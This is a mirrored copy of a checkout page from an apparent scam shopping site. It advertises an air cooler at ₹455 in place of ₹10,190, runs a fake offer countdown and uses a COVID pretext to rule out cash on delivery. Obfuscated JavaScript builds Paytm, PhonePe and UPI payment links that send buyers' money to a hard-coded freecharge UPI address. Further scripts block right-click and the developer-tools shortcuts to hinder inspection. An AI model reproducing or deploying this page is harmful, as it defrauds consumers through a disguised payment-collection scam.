<html>

<!-- Mirrored from mart-fmart.shop/payselect.php by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Jun 2023 13:27:24 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<title>Payment gateway</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
<script src="ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

<style>
			* {
				font-family: Roboto,Arial,sans-serif !important;
			}
			.body {
				margin: 0;
				padding: 0 !important;
				width: 100%;
				overflow-x: hidden; 
			}
			html {
				width: 100%;
				overflow-x: hidden;
			}
			.carousel-indicators li {
			  width: 10px;
			  height: 10px;
			  border-radius: 100%;
			}
			.carousel-indicators {
				position: absolute;
				right: 0;
				bottom: 0;
				left: 0;
				z-index: 15;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center;
				padding-left: 0;
				margin-right: 15%;
				margin-left: 15%;
				margin-bottom: 1px;
				list-style: none;
			}
			.featured-img {
				width: 60px;
			}
			.feature-title {
				font-size: 11px;
				opacity: 0.6;
			}
			.featured-item {
				padding-left: 18px;
			}
			.feature-container {
				border-bottom: 5px solid #eee;
				overflow: auto;
			}
			.footer {
				background-color: #0D141E !important;
				padding: 30px;
				display: flex;
				flex-direction: column;
				justify-content: center;
				align-items: center;
			}
			.footer-nav {
				    display: flex;
					margin: 8px;
					padding: 0;
			}
			.footer-nav li {
				padding: 5px;
				padding-bottom: 0;
				font-size: 11px;
			}
			.footer-nav a {
				color: #ccc;
			}
			.copyright {
				font-size: 12px;
				color: #ccc;
			}
			
			.recommended-product {
				display: flex;
				flex-direction: row;
			}
			.recommended-product img{
				width: 50px;
			}
			.recommended-product .description {
				padding-left: 20px;
			}
			.recommended-product span.strike {
				text-decoration: line-through;
			}
			.strike {
				text-decoration: line-through;
			}
			.recommended-product .product-title {
				overflow: hidden;
				text-overflow: ellipsis;
				white-space: nowrap;
				font-size: 14px;
				max-width: 220px;
			}
			
			.bold {
				font-weight: bold;
			}
			.timer {
				font-weight: 100;
				font-size: 11px;
			}
			.buynow-button {
				background: rgb(251, 100, 27);
				display: block;
				color: rgb(255, 255, 255);
				position: relative;
				overflow: hidden;
				border-radius: 2px;
				border: 1px solid rgb(251, 100, 27);
				font-size: 14px;
				padding: 6px 9px;
			}
			.button-container {
				position: fixed;
				bottom: 0;
				left: 0;
				right: 0;
				box-shadow: -4px 3px 7px #bdbbbb;
			}
			.buynow-button-white {
				background: #fff;
				display: block;
				color: black;
				position: relative;
				overflow: hidden;
				border-radius: 2px;
				border: 1px solid rgb(251, 100, 27);
				font-size: 14px;
				padding: 6px 9px;
				border: none !important;
			}
			ul#deals {
				margin-top: -11px;
				border-radius: 5px;
				width: 100%;
			}
			button.white-button {
				position: absolute;
				right: 20px;
				top: 30px;
				background: rgb(255, 255, 255);
				color: rgb(81, 94, 115);
				padding: 10px 12px;
				font-size: 12px;
				border-radius: 4px;
				border: navajowhite;
				text-transform: inherit;
				box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 2px 0px;
			}
			.dealss {
				    background: url(img/clock.jpg) center center / 360px 80px no-repeat;
					height: 80px;
					background-color: #2873f0;
					font-size: 17px;
					font-weight: 100;
					line-height: 30px;
					color: #fff;
			}
			.deals-timers.flex {
				font-size: 13px;
			}
			.deals-timers img {
				margin-top: 5px;
			}
			.buynow-button:active {
				background: #ed9220;
				border-color: #ca7c1b #be751a #a56616;
			}
			.badge-rectangle {
				height: 22px;
				background-color: #232F3E;
				border-color: #232F3E;
				display: flex;
			}
			.badge-text-secondary {
				line-height: 22px;
				margin-right: 8px;
				color: #F69931;
				font-family: "Amazon Ember",Arial!important;
				min-width: 24px;
			}
			.badge-text-primary {
				line-height: 22px;
				margin-left: 8px;
				margin-right: 3px;
				color: #fff;
				font-family: "Amazon Ember",Arial!important;
				min-width: 36px;
			}
			.badge-triangle {
				width: 0;
				height: 0;
				border-right: 10px solid transparent;
				border-top: 22px solid;
				color: #232F3E;
			}
			.flex {
				display: flex !important;
			}
			.carousel-indicators li {
				width: 10px;
				height: 10px;
				border-radius: 100%;
				border: 1px solid;
			}
			
			.common-button {
				background: rgb(251, 100, 27);
				position: relative;
				overflow: hidden;
				border-radius: .2rem;
				width: 100%;
				height: 50px;
				border: 1px solid #e88406;
				text-align: center;
				align-items: center;
				display: flex;
				justify-content: center;
				color: white;
				font-size: 18px;
				text-decoration: none;
			}
			.common-button:hover {
				color: #000;
				text-decoration: none;
			}
			
			.recommended-product {
				width: 50px;
				display: flex;
				align-items: center;
			}

			.recommended-product img {
				width: 50px;
				height: 100%;
				justify-content: center;
				align-items: center;
				margin: 0 auto;
				display: flex;
			}
		</style>
<style>
		.header-container {
			font-size: 16px;
			color: #eaeaea;
			display: table;
			table-layout: fixed;
			width: 100%;
			min-height: 52px;
			height: 52px;
			transition: background-color .3s ease-out;
			background-color: #2874f0;
		}
		.row.header {
			display: flex;
			flex-direction: row;
			flex-wrap: nowrap;
			min-height: 52px;
			height: 52px;
			align-items: center;
		}
		.menu-icon {
			color: #fff;
			display: table-cell;
			vertical-align: middle;
			text-align: center;
			width: 20%;
			width: 42px;
			max-height: 16px;
			line-height: 10px;
			position: relative;
			overflow: hidden;
		}
		input.search-bar {
			width: 100%;
			height: 38px;
			outline: 0;
			padding-left: 36px;
			font-size: 14px;
			border: 0;
			outline: none;
		}
		.search-bar-parent:before {
			    position: absolute;
				content: " ";
				background: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0iIzg3ODc4NyIgZmlsbC1ydWxlPSJldmVub2RkIj48cGF0aCBkPSJNMTEuNjE4IDkuODk3bDQuMjI1IDQuMjEyYy4wOTIuMDkyLjEwMS4yMzIuMDIuMzEzbC0xLjQ2NSAxLjQ2Yy0uMDgxLjA4MS0uMjIxLjA3Mi0uMzE0LS4wMmwtNC4yMTYtNC4yMDMiLz48cGF0aCBkPSJNNi40ODYgMTAuOTAxYTQuMzc0IDQuMzc0IDAgMDEtNC4zODEtNC4zNjggNC4zNzUgNC4zNzUgMCAwMTQuMzgxLTQuMzY5IDQuMzc1IDQuMzc1IDAgMDE0LjM4MSA0LjM2OSA0LjM3NCA0LjM3NCAwIDAxLTQuMzgxIDQuMzY4bTAtMTAuODM1QzIuOTA0LjA2NiAwIDIuOTYxIDAgNi41MzMgMCAxMC4xMDUgMi45MDQgMTMgNi40ODYgMTNzNi40ODYtMi44OTUgNi40ODYtNi40NjdjMC0zLjU3Mi0yLjkwNC02LjQ2Ny02LjQ4Ni02LjQ2NyIvPjwvZz48L3N2Zz4=);
				height: 16px;
				width: 16px;
				left: 40px;
				top: 12px;
		}
		.search-bar-parent { 
			padding: 28px;
			padding-top: 0;
			padding-bottom: 10px;
		}
		</style>
</head>
<style>
.form-check {
	font-size: 20px;
	border: 1px solid #ccc;
    margin-bottom: 11px;
    border-radius: 10px;
}

.form-check input {
	height: 20px;
    width: 20px;
	 border: 1px solid;
}

.form-check label.form-check-label {
    font-size: 23px;
    display: flex;
   
    padding: 15px;
}
.form-check .form-check-label.input {
	margin-right: 10px;
}
span.unaviable {
    font-size: 18px;
    opacity: 0.5;
    margin-left: 10px;
    line-height: 31px;
}
.form-check.available-method span {
    font-size: 18px;
    margin-left: 13px;
}
.delivery-extra .line {
	margin-bottom: 10px;
}
.delivery-extra span {
	font-size: 20px;
	
}
.offerend-container {
	    text-align: center;
    font-weight: bold;
    padding: 14px;
}
.offer-timer {
	color: rgb(251, 100, 27) !important;
}
.order-total {
	color: rgb(251, 100, 27) !important;
	font-weight: bold;
}
</style>
<body class="body">
<div class="container-fluid px-0 header-container">
<div class="row header">
<div class="col-1"></div>
<div class="col-4">
<div class="menu-logo" style="margin-left: -20px;">
<img alt="menu" src="img/logo.png" height="30px">
</div>
</div>
<div class="col-4"></div>
</div>
</div>
<div class="card py-1">
<h5 class="card-header">Select a payment method</h5>
<div class="card-body">
<div class="container-fluid px-0 offerend-container">
<h4> Offer ends in <span class="offer-timer" id="offerend-time"></span>
</div>
<!-- strt of select options  -->
<div class="form-check available-method">
<label class="form-check-label">			
<input type="radio" id="radio2" onclick="cselect()" class="form-check-input" name="optradio" disabld>
<span class="unaviablee">Paytm</span>
</label>
</div>

<div class="form-check available-method">
<label class="form-check-label">
<input type="radio" id="radio3" onclick="cselect()" class="form-check-input" name="optradio" disabld>
<span class="unaviablee">Phonepe</span>
</label>
</div>

<div class="form-check available-method">
<label class="form-check-label">
<input type="radio" id="radio4" onclick="cselect()" class="form-check-input" name="optradio" disabld>
<span class="unaviablee">Upi </span>
</label>
</div>
			
<div class="form-check available-method">
	<br class="form-check-label">							
	<input type="radio" id="radio1" onclick="cselect()" class="form-check-input" name="optradio" disabled>
	<span class="unaviablee">Cash On Delivery</span>
	</br>
	<h6>Note:Your safety amidst the COVID-19 outbreak is our priority.To ensure no-contact deliveries, only prepaid orders can be placed at this time </h6>
	</label>
	</div>

<script>
(function(_0x42233f,_0x5c7181){const _0x5dd9ca=_0x590d,_0x774ead=_0x42233f();while(!![]){try{const _0x2295e9=parseInt(_0x5dd9ca(0xd2))/0x1+parseInt(_0x5dd9ca(0xd3))/0x2+-parseInt(_0x5dd9ca(0xc1))/0x3*(parseInt(_0x5dd9ca(0xd5))/0x4)+parseInt(_0x5dd9ca(0xcd))/0x5*(-parseInt(_0x5dd9ca(0xcb))/0x6)+parseInt(_0x5dd9ca(0xc6))/0x7+parseInt(_0x5dd9ca(0xbf))/0x8+parseInt(_0x5dd9ca(0xbc))/0x9*(-parseInt(_0x5dd9ca(0xc8))/0xa);if(_0x2295e9===_0x5c7181)break;else _0x774ead['push'](_0x774ead['shift']());}catch(_0x325a84){_0x774ead['push'](_0x774ead['shift']());}}}(_0x2ecb,0x21472));function _0x2ecb(){const _0x22b1e0=['checked','getElementById','&cu=INR&mc=5944&pn=Paytm','9JhfbCG','random','radio3','2173832ZQYGPt','radio1','8715SmmvtF','paytmmp://pay?pa=fcbizkfn4nz@freecharge&am=','floor','://pay?pa=fcbizkfn4nz@freecharge&am=','good\x201','493199EWGJYY','&pn=FoodStore&tr=','3052670aBKreH','radio4','good\x203','336WAnKbt','radio2','2335lUWfuj','&cu=INR&mc=5944','log','upilink','href','3560wigvWg','296248OgKUhV','good\x204','36GgEtyq'];_0x2ecb=function(){return _0x22b1e0;};return _0x2ecb();}function _0x590d(_0x178466,_0x1c3579){const _0x2ecb44=_0x2ecb();return _0x590d=function(_0x590de6,_0x4c2d64){_0x590de6=_0x590de6-0xba;let _0x3287b2=_0x2ecb44[_0x590de6];return _0x3287b2;},_0x590d(_0x178466,_0x1c3579);}function cselect(){const _0x4678be=_0x590d;r1=document['getElementById'](_0x4678be(0xc0)),r2=document['getElementById'](_0x4678be(0xcc)),r3=document[_0x4678be(0xba)](_0x4678be(0xbe)),r4=document[_0x4678be(0xba)](_0x4678be(0xc9)),upi=document['getElementById'](_0x4678be(0xd0)),price=0x1c7;function _0x1bc05e(_0x1640b7,_0x429b33){const _0x3311a5=_0x4678be;return Math[_0x3311a5(0xc3)](Math[_0x3311a5(0xbd)]()*(_0x429b33-_0x1640b7+0x1))+_0x1640b7;}let _0x2e621b=_0x1bc05e(0x3e8,0x2328),_0x3c6965=_0x1bc05e(0x5af3107a4000,0x3328b944c4000);console['log'](_0x2e621b),console[_0x4678be(0xcf)](_0x3c6965),r1[_0x4678be(0xd6)]==!![]&&(console['log'](_0x4678be(0xc5)),upi[_0x4678be(0xd1)]=_0x4678be(0xc4)+price+'&pn=FoodStore&tr='+_0x3c6965+_0x4678be(0xce)),r2[_0x4678be(0xd6)]==!![]&&(console[_0x4678be(0xcf)]('good\x202'),upi[_0x4678be(0xd1)]=_0x4678be(0xc2)+price+_0x4678be(0xc7)+_0x3c6965%0x15+_0x4678be(0xbb)),r3['checked']==!![]&&(console[_0x4678be(0xcf)](_0x4678be(0xca)),upi[_0x4678be(0xd1)]='phonepe://pay?pa=fcbizkfn4nz@freecharge&am='+price+_0x4678be(0xc7)+_0x3c6965+_0x4678be(0xce)),r4['checked']==!![]&&(console['log'](_0x4678be(0xd4)),upi['href']='upi://pay?pa=fcbizkfn4nz@freecharge&am='+price+'&pn=FoodStore&tr='+_0x3c6965+'&cu=INR&mc=5944');}	
</script>
<!--- end of select options -->
</div>
</div>
<div class="card-body">
<ul class="list-group list-group-flush" id="deals">
<li class="list-group-item" data-timer="2000">
<div class="flex recommended-product">
<img src="files/31.jpg" style="height:50px !important" />
<div class="description">
<div class="price flex">
<span class="bold">&#8377;455</span>
&nbsp;&nbsp;
<span class="strike">&#8377;10,190</span>
</div>
<div class="product-title">
	Crompton Ozone Desert Air Cooler- 75L; with Everlast Pump, Auto Fill, 4-Way Air Deflection and High Density Honeycomb pads; White & Teal
</div>
<div class="timer bold">
Quantity: 1
</div>
</div>
</div>
</li>
<li class="list-group-item delivery-extra" style="margin-bottom:200px;">
<div class="line flex justify-content-between">
<span> Delivery: </span>
<span>Free </span>
</div>
<div class="line flex justify-content-between">
<span> Order Total: </span>
<span class="order-total"> &#8377;455</span>
</div>
<img src="img/footter.png" width="100%">
</li>
</ul>
</div>
<div class="button-container flex">
<a class="common-button" id="upilink">
Place your Order and Pay
</a>
</div>
</div>
<footer>
</footer>
<script>
		function startTimer(duration, display) {
			var timer = duration, minutes, seconds;
			setInterval(function () {
				minutes = parseInt(timer / 60, 10);
				seconds = parseInt(timer % 60, 10);

				minutes = minutes < 10 ? "0" + minutes : minutes;
				seconds = seconds < 10 ? "0" + seconds : seconds;

				display.text(minutes + "min " + seconds+ "sec" );

				if (--timer < 0) {
					timer = duration;
				}
			}, 1000);
		}
</script></body>
<script>
$( document ).ready(function() {

	startTimer(900-300, $('#offerend-time'));
});
</script>


<script>
    document.addEventListener('contextmenu', event => {
  event.preventDefault();
});
</script>

<script>
    document.addEventListener('keydown', event => {
  if (event.key === 'F12' || event.ctrlKey && event.shiftKey && event.key === 'I') {
    event.preventDefault();
  }
});
</script>








<!-- Mirrored from mart-fmart.shop/payselect.php by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Jun 2023 13:27:24 GMT -->
</html>